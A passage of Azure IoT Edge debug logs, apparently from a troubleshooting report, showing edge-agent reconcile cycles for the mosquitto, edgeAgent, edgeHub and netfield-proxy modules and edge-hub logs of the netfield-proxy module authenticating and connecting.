1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:30:09.634 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:30:09.643 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:30:09.644 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:30:14.648 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:30:14.648 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:30:14.649 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:30:14.649 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:30:14.649 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:30:14.650 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:30:14.650 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:30:14.679 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:30:14.680 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:30:14.695 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:30:14.699 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:30:14.709 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:30:14.715 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:30:14.716 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:30:19.714 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:30:19.715 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:30:19.715 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:30:19.716 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:30:19.719 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:30:19.720 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:30:19.720 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:30:19.744 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:30:19.747 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:30:19.764 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:30:19.768 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:30:19.775 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:30:19.785 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:30:19.785 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation
<7> 2019-09-11 15:30:24.785 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Starting reconcile operation
<7> 2019-09-11 15:30:24.785 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Making a Http call to unix:///var/run/iotedge/mgmt.sock to List modules
<7> 2019-09-11 15:30:24.786 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:30:24.786 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/mgmt.sock
<7> 2019-09-11 15:30:24.787 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://mgmt.sock/modules?api-version=2019-01-30
<7> 2019-09-11 15:30:24.787 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Getting edge agent config...
<7> 2019-09-11 15:30:24.788 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Obtained edge agent config
<7> 2019-09-11 15:30:24.813 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:30:24.819 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Edgelet.ModuleManagementHttpClient] - Received a valid Http response from unix:///var/run/iotedge/mgmt.sock for List modules
<7> 2019-09-11 15:30:24.832 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of desired modules is - {"mosquitto":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"eclipse-mosquitto:latest","createOptions":"{}"},"env":{}},"edgeAgent":{"version":"","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","createOptions":"{}"},"env":{}},"edgeHub":{"status":"running","restartPolicy":"always","version":"","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"status":"running","restartPolicy":"always","version":"1.0","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:30:24.835 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - List of current modules is - {"mosquitto":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:25:59.9888572+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"eclipse-mosquitto:latest","imageHash":"sha256:332620693b79f2d83d3447195e0f3eb07614698365eb62387379329b0e94570e","createOptions":"{}"},"env":{}},"edgeAgent":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:17:30.4073272+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-agent:1.0.8.1","imageHash":"sha256:dba6e8a482977f4acedf98701bf23e89ff4f5550c6dc8d02641f0c4295e41b3c","createOptions":"{}"},"env":{}},"edgeHub":{"restartPolicy":"always","exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T14:18:12.6971718+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","status":"running","type":"docker","settings":{"image":"mcr.microsoft.com/azureiotedge-hub:1.0.8.1","imageHash":"sha256:259524bca58dab91b25680aafe9b29af4a27dfe3ff0b34e28b6d530028b67298","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"5672\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}"},"env":{}},"netfield-proxy":{"exitCode":0,"statusDescription":"running","lastStartTimeUtc":"2019-09-11T15:26:19.3455599+00:00","lastExitTimeUtc":"0001-01-01T00:00:00","restartCount":0,"lastRestartTimeUtc":"0001-01-01T00:00:00","runtimeStatus":"running","version":"1.0","status":"running","restartPolicy":"always","type":"docker","settings":{"image":"epcontainerregistrytraining.azurecr.io/netfield_proxy:0.9.1-test-arm32v7","imageHash":"sha256:b9de5555882e982781305589a860a6b5b90dddd6108002464e58b1e7e2d5cad6","createOptions":"{\"HostConfig\":{\"PortBindings\":{\"5001/tcp\":[{\"HostPort\":\"5001\"}]},\"Mounts\":[{\"Type\":\"volume\",\"Source\":\"netFIELD_Proxy\",\"Target\":\"/app/appData\"},{\"Type\":\"bind\",\"Source\":\"/etc/gateway/mqtt-config.json\",\"Target\":\"/mqtt-config.json\"},{\"Type\":\"bind\",\"Source\":\"/usr/local/\",\"Target\":\"/host\"},{\"Type\":\"bind\",\"Source\":\"/tmp/\",\"Target\":\"/tmp\"},{\"Type\":\"bind\",\"Source\":\"/usr/bin/swupdate-client\",\"Target\":\"/usr/bin/swupdate-client\"}]}"},"env":{"env":{"value":"xxx"}}
<7> 2019-09-11 15:30:24.844 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Planners.HealthRestartPlanner] - HealthRestartPlanner created Plan, with 0 command(s).
<7> 2019-09-11 15:30:24.851 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.IoTHub.Reporters.IoTHubReporter] - Not updating reported properties as patch was found to be empty
<7> 2019-09-11 15:30:24.851 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Agent.Core.Agent] - Finished reconcile operation

```
</details>

<details>
<summary>edge-hub logs</summary>

```

<7> 2019-09-11 15:26:30.176 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.IDeviceScopeIdentitiesCache] - Refreshing service identity for saschaTest/netfield-proxy
<7> 2019-09-11 15:26:30.207 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Edged.WorkloadClient] - Making a Http call to unix:///var/run/iotedge/workload.sock to SignAsync
<7> 2019-09-11 15:26:30.208 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/workload.sock
<7> 2019-09-11 15:26:30.208 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/workload.sock
<7> 2019-09-11 15:26:30.209 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://workload.sock/modules/%24edgeHub/genid/637031137454675306/sign?api-version=2019-01-30
<7> 2019-09-11 15:26:30.342 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:26:30.344 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Edged.WorkloadClient] - Received a valid Http response from unix:///var/run/iotedge/workload.sock for SignAsync
<7> 2019-09-11 15:26:30.516 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.DeviceScopeApiClient] - Got valid device scope result
<7> 2019-09-11 15:26:30.527 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.ServiceProxy] - Received scope result for saschaTest/netfield-proxy
<7> 2019-09-11 15:26:30.562 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Edged.WorkloadClient] - Making a Http call to unix:///var/run/iotedge/workload.sock to Encrypt
<7> 2019-09-11 15:26:30.563 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connecting socket /var/run/iotedge/workload.sock
<7> 2019-09-11 15:26:30.563 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Connected socket /var/run/iotedge/workload.sock
<7> 2019-09-11 15:26:30.564 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Sending request http://workload.sock/modules/%24edgeHub/genid/637031137454675306/encrypt?api-version=2019-01-30
<7> 2019-09-11 15:26:30.698 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler] - Response received OK
<7> 2019-09-11 15:26:30.699 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Util.Edged.WorkloadClient] - Received a valid Http response from unix:///var/run/iotedge/workload.sock for Encrypt
<7> 2019-09-11 15:26:30.700 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.IDeviceScopeIdentitiesCache] - saschaTest/netfield-proxy is in device scope, adding to cache.
<7> 2019-09-11 15:26:30.708 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.IDeviceScopeIdentitiesCache] - Getting service identity for saschaTest/netfield-proxy
<6> 2019-09-11 15:26:30.736 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Core.DeviceScopeAuthenticator] - Client saschaTest/netfield-proxy in device scope authenticated locally.
<7> 2019-09-11 15:26:30.743 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Authenticator] - Client saschaTest/netfield-proxy authenticated successfully
<6> 2019-09-11 15:26:30.744 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Mqtt.DeviceIdentityProvider] - Successfully generated identity for clientId saschaTest/netfield-proxy and username ntb827eba9f249/saschaTest/netfield-proxy/?api-version=2018-06-30&DeviceClientType=.NET%2F1.21.0%20%28.NET%20Core%204.6.27817.03%3B%20Linux%204.9.80-rt62%20%231%20SMP%20PREEMPT%20RT%20Thu%20Aug%2022%2011%3A04%3A13%20UTC%202019%3B%20Arm%29
<6> 2019-09-11 15:26:30.745 +00:00 [INF] [EdgeHub] - ClientAuthenticated, saschaTest/netfield-proxy, 08224d99
<6> 2019-09-11 15:26:30.794 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionManager] - New device connection for device saschaTest/netfield-proxy
<7> 2019-09-11 15:26:30.796 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.EdgeHubConnection] - Updating device saschaTest/netfield-proxy connection status to Connected
<7> 2019-09-11 15:26:30.797 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Twin.StoringTwinManager] - Updating reported properties for saschaTest/$edgeHub
<7> 2019-09-11 15:26:30.798 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Twin.StoringTwinManager] - Updating reported properties for saschaTest/$edgeHub
<6> 2019-09-11 15:26:30.798 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Core.Device.DeviceMessageHandler] - Bind device proxy for device saschaTest/netfield-proxy
<6> 2019-09-11 15:26:30.799 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Mqtt.MessagingServiceClient] - Binding message channel for device Id saschaTest/netfield-proxy
<7> 2019-09-11 15:26:30.801 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Twin.StoringTwinManager] - Merged reported properties in store for saschaTest/$edgeHub
<7> 2019-09-11 15:26:30.802 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Twin.StoringTwinManager] - Storing reported properties in store for saschaTest/$edgeHub with version 0
<7> 2019-09-11 15:26:30.803 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Twin.StoringTwinManager] - Updating reported properties in store with version 0 for saschaTest/$edgeHub
<7> 2019-09-11 15:26:30.806 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Twin.StoringTwinManager] - Syncing stored reported properties to cloud in saschaTest/$edgeHub
<7> 2019-09-11 15:26:30.807 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Twin.StoringTwinManager] - Found stored reported properties for saschaTest/$edgeHub to sync to cloud
<7> 2019-09-11 15:26:30.808 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Twin.StoringTwinManager] - Updating reported properties for saschaTest/$edgeHub
<7> 2019-09-11 15:26:30.809 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionManager] - Obtained cloud connection for device saschaTest/$edgeHub
<7> 2019-09-11 15:26:30.950 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.DeviceConnectivityManager] - IotHub call succeeded
<7> 2019-09-11 15:26:30.951 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.ConnectivityAwareClient] - Operation UpdateReportedPropertiesAsync succeeded for saschaTest/$edgeHub
<7> 2019-09-11 15:26:30.952 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.CloudProxy] - Updating reported properties for device saschaTest/$edgeHub
<6> 2019-09-11 15:26:30.952 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Core.Twin.StoringTwinManager] - Updated reported properties for saschaTest/$edgeHub
<7> 2019-09-11 15:26:30.953 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.Twin.StoringTwinManager] - Updated reported properties for saschaTest/$edgeHub
<6> 2019-09-11 15:26:31.036 +00:00 [INF] [Microsoft.Azure.Devices.Edge.Hub.Core.SubscriptionProcessor] - Processing subscriptions TwinResponse, Methods for client saschaTest/netfield-proxy.
<7> 2019-09-11 15:26:31.036 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.ConnectionManager] - Obtained cloud connection for device saschaTest/netfield-proxy
<7> 2019-09-11 15:26:31.037 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.SubscriptionProcessor] - Processing subscription TwinResponse for client saschaTest/netfield-proxy.
<7> 2019-09-11 15:26:31.038 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.Core.SubscriptionProcessor] - Processing subscription Methods for client saschaTest/netfield-proxy.
<7> 2019-09-11 15:26:31.038 +00:00 [DBG] [Microsoft.Azure.Devices.Edge.Hub.CloudProxy.DeviceConnectivityManager] - IotHub call succeeded
